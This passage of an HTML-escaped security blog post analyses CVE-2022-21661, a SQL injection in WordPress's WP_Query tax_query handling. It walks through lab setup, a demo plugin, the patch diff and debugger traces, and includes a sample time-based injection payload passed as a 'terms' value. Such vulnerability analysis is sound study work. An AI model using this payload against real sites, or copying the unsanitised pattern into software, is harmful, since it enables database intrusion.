href=&#34;https://www.cve.org/CVERecord?id=CVE-2022-21661&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2022-21661&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: SQL Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &lt;code&gt;3.7.37 ≤ version &amp;lt; 5.8.3&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (8.0)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;WordPress&lt;/strong&gt;: v5.8.2 (vulnerable)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;setup&#34;&gt;&lt;span&gt;Setup&lt;/span&gt;&#xA;  &lt;a href=&#34;#setup&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;required-php-version&#34;&gt;&lt;span&gt;Required PHP Version&lt;/span&gt;&#xA;  &lt;a href=&#34;#required-php-version&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;WordPress is entirely built in PHP, so the PHP version on the server directly affects its operation:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Each PHP version introduces new features and deprecates or removes outdated syntax/functions.&lt;/li&gt;&#xA;&lt;li&gt;If WordPress uses features not supported by an old PHP version → syntax errors or execution failure may occur.&lt;/li&gt;&#xA;&lt;li&gt;Conversely, if PHP is too new, some older functions used by WordPress might be deprecated or removed, causing runtime errors.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;👉 Therefore, the PHP version must be compatible with the WordPress version. In this analysis, we use PHP &lt;strong&gt;7.4&lt;/strong&gt; with WordPress &lt;strong&gt;5.8.2&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vscode-extensions&#34;&gt;&lt;span&gt;VSCode Extensions&lt;/span&gt;&#xA;  &lt;a href=&#34;#vscode-extensions&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Because WordPress source code is complex, reading it line by line manually is not practical. To assist with &lt;strong&gt;debugging&lt;/strong&gt; and &lt;strong&gt;tracing&lt;/strong&gt;, install the following extensions in VS Code:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;PHP Extension Pack&lt;/strong&gt; → search keyword: &lt;code&gt;xdebug.php-pack&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;PHP Tools&lt;/strong&gt; for VS Code → search keyword: &lt;code&gt;devsense.phptools-vscode&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;custom-plugin&#34;&gt;&lt;span&gt;Custom Plugin&lt;/span&gt;&#xA;  &lt;a href=&#34;#custom-plugin&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Since this SQLi vulnerability affects the &lt;strong&gt;WordPress Core&lt;/strong&gt; but can only be exploited &lt;strong&gt;indirectly&lt;/strong&gt; through &lt;strong&gt;plugins&lt;/strong&gt; or &lt;strong&gt;themes&lt;/strong&gt; that use &lt;code&gt;WP_Query&lt;/code&gt;, we must interact with it via such a plugin or theme.&lt;/p&gt;&#xA;&lt;p&gt;We create a &lt;strong&gt;plugin&lt;/strong&gt; using &lt;code&gt;WP_Query&lt;/code&gt;, displaying the SQL query executed through &lt;code&gt;WP_Query::request&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;/**&#xA; * Plugin Name: Demo WP_Query&#xA; * Description: Demo plugin for WP_Query&#xA; * Version: 1.0&#xA; * Author: w41bu1&#xA; */&#xA;&#xA;if (!defined(&amp;#39;ABSPATH&amp;#39;))&#xA;    exit;&#xA;&#xA;function da_show_posts()&#xA;{&#xA;    $args = [&#xA;        &amp;#39;post_type&amp;#39; =&amp;gt; &amp;#39;post&amp;#39;,&#xA;        &amp;#39;tax_query&amp;#39; =&amp;gt; [&#xA;            [&#xA;                &amp;#39;taxonomy&amp;#39; =&amp;gt; &amp;#39;category&amp;#39;,&#xA;                &amp;#39;field&amp;#39; =&amp;gt; &amp;#39;term_taxonomy_id&amp;#39;,&#xA;                &amp;#39;terms&amp;#39; =&amp;gt; [1,2,3],&#xA;                &amp;#39;operator&amp;#39; =&amp;gt; &amp;#39;IN&amp;#39;,&#xA;            ],&#xA;        ],&#xA;    ];&#xA;&#xA;    $query = new WP_Query($args);&#xA;&#xA;    ob_start();&#xA;&#xA;    echo &amp;#39;&amp;lt;h3&amp;gt;Demo WP_Query&amp;lt;/h3&amp;gt;&amp;#39;;&#xA;    echo &amp;#39;&amp;lt;pre style=&amp;#34;background:#f0f0f0; padding:15px; width:100%; white-space:pre-wrap; word-wrap:break-word; overflow:auto;&amp;#34;&amp;gt;&amp;#39;;&#xA;    echo &amp;#34;SQL query generated by WP_Query:\n\n&amp;#34;;&#xA;    echo esc_html($query-&amp;gt;request); &#xA;    echo &amp;#39;&amp;lt;/pre&amp;gt;&amp;#39;;&#xA;&#xA;    if ($query-&amp;gt;have_posts()) {&#xA;        echo &amp;#39;&amp;lt;ul&amp;gt;&amp;#39;;&#xA;        while ($query-&amp;gt;have_posts()) {&#xA;            $query-&amp;gt;the_post();&#xA;            echo &amp;#39;&amp;lt;li&amp;gt;&amp;#39; . get_the_title() . &amp;#39; (&amp;#39; . get_the_ID() . &amp;#39;)&amp;lt;/li&amp;gt;&amp;#39;;&#xA;        }&#xA;        echo &amp;#39;&amp;lt;/ul&amp;gt;&amp;#39;;&#xA;    } else {&#xA;        echo &amp;#39;&amp;lt;p&amp;gt;No posts found.&amp;lt;/p&amp;gt;&amp;#39;;&#xA;    }&#xA;&#xA;    wp_reset_postdata();&#xA;    return ob_get_clean();&#xA;}&#xA;add_shortcode(&amp;#39;demo_wp_query&amp;#39;, &amp;#39;da_show_posts&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/classes/wp_query/#taxonomy-parameters&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Taxonomy parameters&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;Create a new page with &lt;code&gt;&amp;lt;page-title&amp;gt;&lt;/code&gt; containing the &lt;strong&gt;shortcode&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;[demo_wp_query]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;👉 The query will be displayed when visiting &lt;code&gt;http://localhost/&amp;lt;page-title&amp;gt;&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/demo_page.png&#34; title=&#34;Demo page displaying WP_Query output&#34; data-thumbnail=&#34;/posts/2025-10-01-cve-2022-21661/demo_page.png&#34; data-sub-html=&#34;&lt;h2&gt;demo page&lt;/h2&gt;&lt;p&gt;Demo page displaying WP_Query output&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-01-cve-2022-21661/demo_page.png&#39; alt=&#34;demo page&#34; height=&#34;895&#34; width=&#34;1306&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Demo page displaying WP_Query output&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;wpdb&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Core PHP class used by WordPress to directly interact with MySQL.&lt;/li&gt;&#xA;&lt;li&gt;Allows developers to &lt;strong&gt;write and execute raw SQL queries&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;WP_Query&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;An abstraction layer that retrieves post data from the database &lt;strong&gt;without writing raw SQL&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Developers simply pass an array of parameters (args), and WordPress automatically builds the appropriate SQL.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Relationship&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;WP_Query&lt;/code&gt; doesn’t directly query MySQL.&lt;/li&gt;&#xA;&lt;li&gt;Instead, it builds SQL based on the arguments, applies &lt;strong&gt;validation/sanitization&lt;/strong&gt;, and then calls &lt;code&gt;$wpdb&lt;/code&gt; to execute it.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;WordPress is an &lt;strong&gt;open-source&lt;/strong&gt; project with a public GitHub repository, meaning all patches are committed openly.&#xA;To analyze a vulnerability, we can simply review the related commit and observe the code changes.&lt;/p&gt;&#xA;&lt;p&gt;The reference for &lt;strong&gt;CVE-2022-21661&lt;/strong&gt; links to this &lt;a href=&#34;https://github.com/WordPress/wordpress-develop/commit/17efac8c8ec64555eff5cf51a3eff81e06317214&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;commit&lt;/a&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/patch_diff.png&#34; title=&#34;Patch diff between versions&#34; data-thumbnail=&#34;/posts/2025-10-01-cve-2022-21661/patch_diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch Diff&lt;/h2&gt;&lt;p&gt;Patch diff between versions&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-01-cve-2022-21661/patch_diff.png&#39; alt=&#34;Patch Diff&#34; height=&#34;389&#34; width=&#34;830&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch diff between versions&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The vulnerability was fixed in &lt;strong&gt;src/wp-includes/class-wp-tax-query.php&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Vulnerable Code&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$query[&amp;#39;terms&amp;#39;] = array_unique( (array) $query[&amp;#39;terms&amp;#39;] );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Casts &lt;code&gt;$query[&#39;terms&#39;]&lt;/code&gt; to an array and removes duplicates.&lt;/li&gt;&#xA;&lt;li&gt;No type checking or sanitization — allowing injection of malicious values into the SQL query.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Example:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$args = [&#xA;    &amp;#39;post_type&amp;#39; =&amp;gt; &amp;#39;post&amp;#39;,&#xA;    &amp;#39;tax_query&amp;#39; =&amp;gt; [&#xA;        [&#xA;            &amp;#39;taxonomy&amp;#39; =&amp;gt; &amp;#39;category&amp;#39;,&#xA;            &amp;#39;field&amp;#39; =&amp;gt; &amp;#39;term_taxonomy_id&amp;#39;,&#xA;            &amp;#39;terms&amp;#39; =&amp;gt; [&amp;#39;1) AND (SELECT SLEEP(5)) # &amp;#39;],&#xA;            &amp;#39;operator&amp;#39; =&amp;gt; &amp;#39;IN&amp;#39;,&#xA;        ],&#xA;    ],&#xA;];&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Patched Code&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( &amp;#39;slug&amp;#39; === $query[&amp;#39;field&amp;#39;] || &amp;#39;name&amp;#39; === $query[&amp;#39;field&amp;#39;] ) {&#xA;    $query[&amp;#39;terms&amp;#39;] = array_unique( (array) $query[&amp;#39;terms&amp;#39;] );&#xA;} else {&#xA;    $query[&amp;#39;terms&amp;#39;] = wp_parse_id_list( $query[&amp;#39;terms&amp;#39;] );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Added a conditional check based on &lt;code&gt;$query[&#39;field&#39;]&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;If it’s &lt;strong&gt;slug&lt;/strong&gt; or &lt;strong&gt;name&lt;/strong&gt; → keep the old behavior.&lt;/li&gt;&#xA;&lt;li&gt;If it’s an &lt;strong&gt;ID&lt;/strong&gt; → use &lt;code&gt;wp_parse_id_list()&lt;/code&gt; to cast all elements into an integer array safely.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;This ensures that for &lt;code&gt;tax_query&lt;/code&gt; fields such as &lt;code&gt;term_taxonomy_id&lt;/code&gt; and &lt;code&gt;term_id&lt;/code&gt;, which correspond to &lt;strong&gt;BIGINT UNSIGNED&lt;/strong&gt; columns, only numeric values are used.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;pre&gt;&lt;code&gt;mysql&amp;gt; DESC wp_term_taxonomy;&#xA;&amp;#43;------------------&amp;#43;-----------------&amp;#43;------&amp;#43;-----&amp;#43;---------&amp;#43;----------------&amp;#43;&#xA;| Field            | Type            | Null | Key | Default | Extra          |&#xA;&amp;#43;------------------&amp;#43;-----------------&amp;#43;------&amp;#43;-----&amp;#43;---------&amp;#43;----------------&amp;#43;&#xA;| term_taxonomy_id | bigint unsigned | NO   | PRI | NULL    | auto_increment |&#xA;| term_id          | bigint unsigned | NO   | MUL | 0       |                |&#xA;| taxonomy         | varchar(32)     | NO   | MUL |         |                |&#xA;| description      | longtext        | NO   |     | NULL    |                |&#xA;| parent           | bigint unsigned | NO   |     | 0       |                |&#xA;| count            | bigint          | NO   |     | 0       |                |&#xA;&amp;#43;------------------&amp;#43;-----------------&amp;#43;------&amp;#43;-----&amp;#43;---------&amp;#43;----------------&amp;#43;&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-works&#34;&gt;&lt;span&gt;How it works&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-works&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/debug1.png&#34; title=&#34;Breakpoint at clean_query start&#34; data-thumbnail=&#34;/posts/2025-10-01-cve-2022-21661/debug1.png&#34; data-sub-html=&#34;&lt;h2&gt;Debug 1&lt;/h2&gt;&lt;p&gt;Breakpoint at clean_query start&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-01-cve-2022-21661/debug1.png&#39; alt=&#34;Debug 1&#34; height=&#34;392&#34; width=&#34;1279&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Breakpoint at clean_query start&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/debug2.png&#34; title=&#34;Continue to matching taxonomy query&#34; data-thumbnail=&#34;/posts/2025-10-01-cve-2022-21661/debug2.png&#34; data-sub-html=&#34;&lt;h2&gt;Debug 2&lt;/h2&gt;&lt;p&gt;Continue to matching taxonomy query&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-01-cve-2022-21661/debug2.png&#39; alt=&#34;Debug 2&#34; height=&#34;390&#34; width=&#34;1283&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Continue to matching taxonomy query&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/debug3.png&#34; title=&#34;Observe wp_list_pluck overwriting terms&#34; data-thumbnail=&#34;/posts/2025-10-01-cve-2022-21661/debug3.png&#34; data-sub-html=&#34;&lt;h2&gt;Debug 3&lt;/h2&gt;&lt;p&gt;Observe wp_list_pluck overwriting terms&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-01-cve-2022-21661/debug3.png&#39; alt=&#34;Debug 3&#34; height=&#34;540&#34; width=&#34;1289&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Observe wp_list_pluck overwriting terms&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/debug4.png&#34; title=&#34;Prevent overwrite with early return&#34; data-thumbnail=&#34;/posts/2025-10-01-cve-2022-21661/debug4.png&#34; data-sub-html=&#34;&lt;h2&gt;Debug 4&lt;/h2&gt;&lt;p&gt;Prevent overwrite with early return&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-01-cve-2022-21661/debug4.png&#39; alt=&#34;Debug 4&#34; height=&#34;321&#34; width=&#34;1016&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Prevent overwrite with early return&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/debug5.png&#34; title=&#34;Payload remains in executed query&#34; data-thumbnail=&#34;/posts/2025-10-01-cve-2022-21661/debug5.png&#34; data-sub-html=&#34;&lt;h2&gt;Debug 5&lt;/h2&gt;&lt;p&gt;Payload remains in executed query&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-01-cve-2022-21661/debug5.png&#39; alt=&#34;Debug 5&#34; height=&#34;896&#34; width=&#34;1393&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Payload remains in executed query&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; 